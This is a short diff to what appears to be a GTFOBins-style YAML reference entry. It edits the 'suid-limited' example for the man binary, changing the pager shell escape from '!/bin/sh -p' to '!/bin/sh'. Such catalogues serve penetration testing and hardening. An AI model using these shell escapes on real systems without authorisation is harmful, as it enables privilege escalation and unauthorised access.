@@ -11,5 +11,5 @@ functions:
   suid-limited:
     - code: |-
         ./man man
-        !/bin/sh -p
+        !/bin/sh
 ---
